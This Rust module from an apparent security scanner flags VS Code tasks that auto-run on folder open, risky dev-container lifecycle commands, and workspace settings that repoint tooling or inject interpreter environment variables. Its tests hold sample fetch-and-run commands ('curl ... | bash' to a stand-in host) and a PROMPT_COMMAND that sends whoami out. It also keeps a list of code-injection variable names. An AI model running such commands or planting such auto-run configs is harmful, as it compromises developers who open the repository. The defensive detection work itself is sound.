//! Editor and IDE configuration that executes code automatically: VS Code
//! tasks that run on folder open, dev-container lifecycle commands (of which
//! `initializeCommand` runs on the host, not in the container), and workspace
//! settings that repoint developer tooling at files shipped inside the repo.

use super::util::{dangerous_command_reason, find_line, parse_jsonc, path_contains, trim_evidence};
use super::{Check, CheckContext};
use crate::model::{Finding, Severity};
use crate::rule::{Category, Confidence, Rule, RuleId};
use serde_json::Value as JsonValue;
use std::borrow::Cow;
use std::path::Path;

pub struct EditorConfig;

const SOURCE: &str = "Husk editor config scanner";

macro_rules! rule {
    ($id:literal, $title:literal, $sev:expr, $why:literal) => {
        Rule {
            id: RuleId::lit($id),
            title: Cow::Borrowed($title),
            category: Category::ExposedConfig,
            default_severity: $sev,
            rationale: Cow::Borrowed($why),
        }
    };
}

static RULES: &[Rule] = &[
    rule!(
        "editor-auto-run-task",
        "Editor task runs automatically when the folder is opened",
        Severity::High,
        "A tasks.json entry with runOptions.runOn set to folderOpen executes a shell command the moment the cloned repo is opened, and presentation settings can hide that it ran at all."
    ),
    rule!(
        "devcontainer-host-command",
        "Dev container config runs a lifecycle command automatically",
        Severity::High,
        "initializeCommand runs on the host machine, not in the container, so container isolation does not apply to it; create-time commands run automatically inside the container."
    ),
    rule!(
        "editor-tooling-repoint",
        "Workspace settings repoint editor tooling into the repository",
        Severity::Medium,
        "A practitioner heuristic with no vendor guidance behind it: a workspace settings key can point the interpreter, a tool binary, or the terminal environment at a file the repo ships, which executes when the tool next runs."
    ),
];

/// A task `command`/arg is a string or a `{ "value": …, "quoting": … }` object.
fn command_string(value: &JsonValue) -> Option<String> {
    match value {
        JsonValue::String(text) => Some(text.clone()),
        JsonValue::Object(map) => map
            .get("value")
            .and_then(JsonValue::as_str)
            .map(str::to_string),
        _ => None,
    }
}

fn task_command_line(task: &JsonValue) -> Option<String> {
    let base = task.get("command").and_then(command_string).or_else(|| {
        ["linux", "osx", "windows"].iter().find_map(|os| {
            task.get(*os)
                .and_then(|overlay| overlay.get("command"))
                .and_then(command_string)
        })
    })?;
    let mut parts = vec![base];
    if let Some(args) = task.get("args").and_then(JsonValue::as_array) {
        parts.extend(args.iter().filter_map(command_string));
    }
    Some(parts.join(" "))
}

/// The task shapes that suppress any visible trace of the run.
fn concealment(task: &JsonValue) -> Option<&'static str> {
    if task.get("hide").and_then(JsonValue::as_bool) == Some(true) {
        return Some("the task is hidden from the task list");
    }
    let presentation = task.get("presentation")?;
    if presentation.get("reveal").and_then(JsonValue::as_str) == Some("never") {
        return Some("the terminal is never revealed");
    }
    if presentation.get("echo").and_then(JsonValue::as_bool) == Some(false) {
        return Some("the command echo is turned off");
    }
    if presentation.get("close").and_then(JsonValue::as_bool) == Some(true) {
        return Some("the terminal closes as soon as the task finishes");
    }
    None
}

fn scan_tasks(path: &Path, contents: &str, json: &JsonValue, out: &mut Vec<Finding>) {
    let Some(tasks) = json.get("tasks").and_then(JsonValue::as_array) else {
        return;
    };
    for (index, task) in tasks.iter().enumerate() {
        let run_on = task
            .get("runOptions")
            .and_then(|options| options.get("runOn"))
            .and_then(JsonValue::as_str);
        if run_on != Some("folderOpen") {
            continue;
        }
        let label = task
            .get("label")
            .and_then(JsonValue::as_str)
            .map(str::to_string)
            .unwrap_or_else(|| format!("#{index}"));
        let command = task_command_line(task);
        let hidden = concealment(task);
        let danger = command.as_deref().and_then(dangerous_command_reason);
        let severity = if hidden.is_some() || danger.is_some() {
            Severity::Critical
        } else {
            Severity::High
        };
        let mut summary = format!(
            "The '{label}' task runs a shell command as soon as this folder is opened in the editor"
        );
        if let Some(reason) = danger {
            summary.push_str(&format!(", and that command {reason}"));
        }
        if let Some(how) = hidden {
            summary.push_str(&format!(", while {how}"));
        }
        summary.push('.');
        out.push(
            Finding::from_rule("editor-auto-run-task")
                .id(format!("editor-auto-run:{label}"))
                .severity(severity)
                .source(SOURCE)
                .at(
                    path.to_path_buf(),
                    find_line(contents, "\"folderOpen\"").or_else(|| find_line(contents, "folderOpen")),
                )
                .summary(summary)
                .evidence(trim_evidence(
                    command.as_deref().unwrap_or("task has no command field"),
                ))
                .recommend(
                    "Remove runOptions.runOn: folderOpen unless you added it yourself, and set task.allowAutomaticTasks to \"off\" in your user settings so no repo can auto-run tasks.",
                ),
        );
    }
}

/// A dev-container lifecycle command is a string (shell), an array (argv), or
/// an object of named parallel commands.
fn lifecycle_commands(value: &JsonValue) -> Vec<String> {
    match value {
        JsonValue::String(text) => vec![text.clone()],
        JsonValue::Array(argv) => {
            let joined = argv
                .iter()
                .filter_map(JsonValue::as_str)
                .collect::<Vec<_>>()
                .join(" ");
            if joined.is_empty() {
                Vec::new()
            } else {
                vec![joined]
            }
        }
        JsonValue::Object(map) => map.values().flat_map(lifecycle_commands).collect(),
        _ => Vec::new(),
    }
}

fn scan_devcontainer(path: &Path, contents: &str, json: &JsonValue, out: &mut Vec<Finding>) {
    if let Some(value) = json.get("initializeCommand") {
        for command in lifecycle_commands(value) {
            let danger = dangerous_command_reason(&command);
            let mut summary = String::from(
                "initializeCommand runs on the host machine, not in the container, whenever the dev container is created or reopened",
            );
            if let Some(reason) = danger {
                summary.push_str(&format!(", and the command {reason}"));
            }
            summary.push('.');
            out.push(
                Finding::from_rule("devcontainer-host-command")
                    .id(format!("devcontainer-init:{command}"))
                    .severity(if danger.is_some() {
                        Severity::Critical
                    } else {
                        Severity::High
                    })
                    .source(SOURCE)
                    .at(path.to_path_buf(), find_line(contents, "initializeCommand"))
                    .summary(summary)
                    .evidence(trim_evidence(&command))
                    .recommend(
                        "Remove initializeCommand unless you wrote it yourself; container isolation does not apply to it. Run required host setup by hand instead.",
                    ),
            );
        }
    }
    for key in ["onCreateCommand", "postCreateCommand"] {
        let Some(value) = json.get(key) else {
            continue;
        };
        for command in lifecycle_commands(value) {
            let Some(reason) = dangerous_command_reason(&command) else {
                continue;
            };
            out.push(
                Finding::from_rule("devcontainer-host-command")
                    .id(format!("devcontainer-create:{key}:{command}"))
                    .severity(Severity::Medium)
                    .source(SOURCE)
                    .at(path.to_path_buf(), find_line(contents, key))
                    .summary(format!(
                        "The {key} lifecycle command {reason}; it runs automatically inside the container when it is created."
                    ))
                    .evidence(trim_evidence(&command))
                    .recommend(
                        "Review the command before building the container, and pin what it fetches so a rebuild cannot pull different code.",
                    ),
            );
        }
    }
}

/// Does a settings value point into the workspace? Absolute paths, `~`, env
/// and user-home substitutions, and bare command names (PATH lookups) do not.
fn workspace_relative(value: &str) -> bool {
    if value.contains("${workspaceFolder}") || value.contains("${workspaceRoot}") {
        return true;
    }
    let trimmed = value.trim();
    if trimmed.starts_with('~')
        || trimmed.starts_with('$')
        || trimmed.starts_with('%')
        || trimmed.contains("${env")
        || trimmed.contains("${userHome}")
        || trimmed.starts_with('/')
        || trimmed.starts_with('\\')
        || (trimmed.len() >= 2 && trimmed.as_bytes()[1] == b':')
    {
        return false;
    }
    trimmed.contains('/') || trimmed.contains('\\')
}

/// Virtualenv shapes are the overwhelmingly common benign case of a
/// repo-relative interpreter path (developer-created, normally gitignored), so
/// they are excluded rather than flagged. Part of the stated heuristic.
fn looks_like_virtualenv(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    lower.contains("venv") || lower.contains(".tox/") || lower.contains("conda")
}

const REPOINT_KEY_SUFFIXES: &[&str] = &[".path", ".interpreterPath", ".executablePath"];

/// Environment variables that make the shell or an interpreter execute
/// attacker-chosen code in every process they reach, so a workspace settings
/// file has no business setting them at all.
const INJECTION_ENV_NAMES: &[&str] = &[
    "NODE_OPTIONS",
    "PYTHONSTARTUP",
    "PYTHONPATH",
    "LD_PRELOAD",
    "DYLD_INSERT_LIBRARIES",
    "PROMPT_COMMAND",
    "BASH_ENV",
    "ZDOTDIR",
    "PERL5OPT",
    "RUBYOPT",
];

fn scan_settings(path: &Path, contents: &str, json: &JsonValue, out: &mut Vec<Finding>) {
    let Some(map) = json.as_object() else {
        return;
    };
    for (key, value) in map {
        if let Some(text) = value.as_str() {
            if REPOINT_KEY_SUFFIXES
                .iter()
                .any(|suffix| key.ends_with(suffix))
                && workspace_relative(text)
                && !looks_like_virtualenv(text)
            {
                out.push(
                    Finding::from_rule("editor-tooling-repoint")
                        .id(format!("editor-repoint:{key}"))
                        .severity(Severity::Medium)
                        .confidence(Confidence::Tentative)
                        .source(SOURCE)
                        .at(path.to_path_buf(), find_line(contents, key))
                        .summary(format!(
                            "The workspace setting {key} points editor tooling at a path inside the repository, so opening the repo decides what binary your editor runs. This is a practitioner heuristic; verify the path is one you set up."
                        ))
                        .evidence(trim_evidence(text))
                        .recommend(
                            "Point tools at binaries installed outside the repository, or confirm you created this path yourself.",
                        ),
                );
            }
            continue;
        }
        if key.starts_with("terminal.integrated.env.") {
            let Some(env) = value.as_object() else {
                continue;
            };
            for (name, entry) in env {
                let Some(text) = entry.as_str() else {
                    continue;
                };
                let repoint = workspace_relative(text);
                let danger = dangerous_command_reason(text);
                let injection = INJECTION_ENV_NAMES.contains(&name.as_str());
                if !repoint && danger.is_none() && !injection {
                    continue;
                }
                let summary = if injection {
                    format!(
                        "The workspace setting {key} sets {name} for every integrated terminal, which makes the shell or interpreter execute the configured code in each process it starts."
                    )
                } else if let (Some(reason), false) = (danger, repoint) {
                    format!(
                        "The workspace setting {key} injects {name} into every integrated terminal, and its value {reason}."
                    )
                } else {
                    format!(
                        "The workspace setting {key} injects {name} into every integrated terminal, pointing at a path inside the repository. This is a practitioner heuristic; verify the entry is one you set up."
                    )
                };
                out.push(
                    Finding::from_rule("editor-tooling-repoint")
                        .id(format!("editor-repoint:{key}:{name}"))
                        .severity(Severity::Medium)
                        .confidence(Confidence::Tentative)
                        .source(SOURCE)
                        .at(path.to_path_buf(), find_line(contents, name))
                        .summary(summary)
                        .evidence(trim_evidence(text))
                        .recommend(
                            "Remove terminal environment entries you did not add; they apply to every shell the editor opens in this workspace.",
                        ),
                );
            }
        }
    }
}

/// A commented or malformed file must not be silently unscanned: if the JSONC
/// parse still fails, gate on the load-bearing substring and report at reduced
/// confidence.
fn fallback_substring(
    path: &Path,
    contents: &str,
    needle: &str,
    rule_id: &str,
    summary: &str,
    out: &mut Vec<Finding>,
) {
    if !contents.contains(needle) {
        return;
    }
    let line = find_line(contents, needle);
    let snippet = line
        .and_then(|number| contents.lines().nth(number - 1))
        .unwrap_or(needle);
    out.push(
        Finding::from_rule(rule_id)
            .id(format!("{rule_id}-unparsed"))
            .severity(Severity::High)
            .confidence(Confidence::Tentative)
            .source(SOURCE)
            .at(path.to_path_buf(), line)
            .summary(summary.to_string())
            .evidence(trim_evidence(snippet))
            .recommend("Open the file and review the surrounding configuration by hand."),
    );
}

impl Check for EditorConfig {
    fn rules(&self) -> &'static [Rule] {
        RULES
    }
    fn applies(&self, ctx: &CheckContext) -> bool {
        match ctx.file_name() {
            "tasks.json" | "settings.json" => path_contains(ctx.path, ".vscode"),
            "devcontainer.json" | ".devcontainer.json" => true,
            _ => false,
        }
    }
    fn run(&self, ctx: &CheckContext, out: &mut Vec<Finding>) {
        let parsed = parse_jsonc(ctx.contents);
        match ctx.file_name() {
            "tasks.json" => match &parsed {
                Some(json) => scan_tasks(ctx.path, ctx.contents, json, out),
                None => fallback_substring(
                    ctx.path,
                    ctx.contents,
                    "folderOpen",
                    "editor-auto-run-task",
                    "This tasks.json could not be parsed, but it contains \"folderOpen\", the trigger that runs a task the moment the folder is opened.",
                    out,
                ),
            },
            "settings.json" => {
                if let Some(json) = &parsed {
                    scan_settings(ctx.path, ctx.contents, json, out);
                }
            }
            "devcontainer.json" | ".devcontainer.json" => match &parsed {
                Some(json) => scan_devcontainer(ctx.path, ctx.contents, json, out),
                None => fallback_substring(
                    ctx.path,
                    ctx.contents,
                    "initializeCommand",
                    "devcontainer-host-command",
                    "This devcontainer.json could not be parsed, but it contains \"initializeCommand\", which runs on the host machine, not in the container.",
                    out,
                ),
            },
            _ => {}
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn run_at(path: &str, contents: &str) -> Vec<Finding> {
        let mut out = Vec::new();
        let ctx = CheckContext::new(Path::new(path), contents);
        if EditorConfig.applies(&ctx) {
            EditorConfig.run(&ctx, &mut out);
        }
        out
    }

    fn run_tasks(contents: &str) -> Vec<Finding> {
        run_at("/repo/.vscode/tasks.json", contents)
    }

    fn has_rule(findings: &[Finding], id: &str) -> bool {
        findings
            .iter()
            .any(|f| f.rule_id.as_ref().unwrap().as_str() == id)
    }

    #[test]
    fn flags_folder_open_task_and_ignores_manual_tasks() {
        let f = run_tasks(
            r#"{"version":"2.0.0","tasks":[
                {"label":"evil","type":"shell","command":"node x.js",
                 "runOptions":{"runOn":"folderOpen"}},
                {"label":"build","type":"shell","command":"npm run build"}]}"#,
        );
        assert_eq!(f.len(), 1);
        assert!(has_rule(&f, "editor-auto-run-task"));
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].evidence.as_deref() == Some("node x.js"));
    }

    #[test]
    fn concealed_or_dangerous_folder_open_tasks_are_critical() {
        let hidden = run_tasks(
            r#"{"tasks":[{"label":"h","command":"node x.js","hide":true,
                "runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(hidden[0].severity, Severity::Critical);

        let suppressed = run_tasks(
            r#"{"tasks":[{"label":"s","command":"node x.js",
                "presentation":{"reveal":"never","echo":false,"close":true},
                "runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(suppressed[0].severity, Severity::Critical);

        // The JFrog hijacked-npm shape: a downloader disguised as a font fetch.
        let downloader = run_tasks(
            r#"{"tasks":[{"label":"d","command":"curl -s http://x.invalid/fa-solid-400.woff2 -o /tmp/f",
                "runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(downloader[0].severity, Severity::Critical);
        assert!(downloader[0].evidence.as_ref().unwrap().contains("curl"));
    }

    #[test]
    fn tasks_json_with_comments_and_trailing_commas_still_parses() {
        let f = run_tasks(
            r#"{
                // led by a comment
                "version": "2.0.0", /* block */
                "tasks": [
                    {
                        "label": "c",
                        "command": "node x.js", // trailing comment
                        "runOptions": { "runOn": "folderOpen" },
                    },
                ],
            }"#,
        );
        assert!(has_rule(&f, "editor-auto-run-task"));
    }

    #[test]
    fn unparseable_tasks_json_falls_back_to_the_substring_gate() {
        let f = run_tasks(r#"{"tasks":[ BROKEN "runOn": "folderOpen" }"#);
        assert!(has_rule(&f, "editor-auto-run-task"));
        assert_eq!(f[0].confidence, Confidence::Tentative);
        // No folderOpen, no finding, even when unparseable.
        assert!(run_tasks(r#"{"tasks":[ BROKEN ]"#).is_empty());
    }

    #[test]
    fn tasks_json_outside_a_vscode_directory_is_ignored() {
        let ctx = CheckContext::new(
            Path::new("/repo/tasks.json"),
            r#"{"tasks":[{"command":"x","runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert!(!EditorConfig.applies(&ctx));
    }

    #[test]
    fn devcontainer_initialize_command_runs_on_the_host() {
        let f = run_at(
            "/repo/.devcontainer/devcontainer.json",
            r#"{"initializeCommand":"./scripts/setup.sh"}"#,
        );
        assert!(has_rule(&f, "devcontainer-host-command"));
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].summary.contains("host"));
    }

    #[test]
    fn dangerous_initialize_command_is_critical_and_array_forms_are_joined() {
        let f = run_at(
            "/repo/devcontainer.json",
            r#"{"initializeCommand":["bash","-c","curl -s http://x.invalid/p | bash"]}"#,
        );
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(f[0].evidence.as_ref().unwrap().contains("curl"));
    }

    #[test]
    fn create_commands_are_flagged_only_with_a_dangerous_shape_and_stay_medium() {
        let f = run_at(
            "/repo/.devcontainer/devcontainer.json",
            r#"{"postCreateCommand":"curl -sL http://x.invalid/i.sh | sh","onCreateCommand":"npm ci"}"#,
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Medium);
        assert!(f[0].summary.contains("postCreateCommand"));
    }

    #[test]
    fn unparseable_devcontainer_with_initialize_command_is_still_reported() {
        let f = run_at(
            "/repo/.devcontainer/devcontainer.json",
            r#"{ BROKEN "initializeCommand": "./x.sh" }"#,
        );
        assert!(has_rule(&f, "devcontainer-host-command"));
        assert_eq!(f[0].confidence, Confidence::Tentative);
    }

    #[test]
    fn settings_repoint_flags_workspace_paths_but_not_system_or_venv_paths() {
        let f = run_at(
            "/repo/.vscode/settings.json",
            r#"{"php.validate.executablePath":"${workspaceFolder}/tools/php",
                "python.defaultInterpreterPath":"${workspaceFolder}/.venv/bin/python",
                "git.path":"/usr/bin/git",
                "go.alternateTools.path":"gofmt"}"#,
        );
        assert_eq!(f.len(), 1);
        assert!(has_rule(&f, "editor-tooling-repoint"));
        assert_eq!(f[0].severity, Severity::Medium);
        assert_eq!(f[0].confidence, Confidence::Tentative);
        assert!(f[0].summary.contains("php.validate.executablePath"));
    }

    #[test]
    fn terminal_env_repoints_and_dangerous_values_are_flagged() {
        let f = run_at(
            "/repo/.vscode/settings.json",
            r#"{"terminal.integrated.env.linux":{
                "LD_PRELOAD":"${workspaceFolder}/.cache/hook.so",
                "PROMPT_COMMAND":"curl -s http://x.invalid/$(whoami)",
                "EDITOR":"vim"}}"#,
        );
        assert_eq!(f.len(), 2);
        assert!(f.iter().any(|x| x.summary.contains("LD_PRELOAD")));
        assert!(f.iter().any(|x| x.summary.contains("PROMPT_COMMAND")));
    }

    #[test]
    fn interpreter_injection_env_names_are_flagged_even_with_benign_looking_values() {
        let f = run_at(
            "/repo/.vscode/settings.json",
            r#"{"terminal.integrated.env.osx":{
                "NODE_OPTIONS":"--require /tmp/x.js",
                "PYTHONSTARTUP":"$HOME/.cache/s.py",
                "PYTHONPATH":"${workspaceFolder}/lib",
                "TERM":"xterm-256color"}}"#,
        );
        assert_eq!(f.len(), 3);
        for name in ["NODE_OPTIONS", "PYTHONSTARTUP", "PYTHONPATH"] {
            assert!(f.iter().any(|x| x.summary.contains(name)), "missing {name}");
        }
    }
}
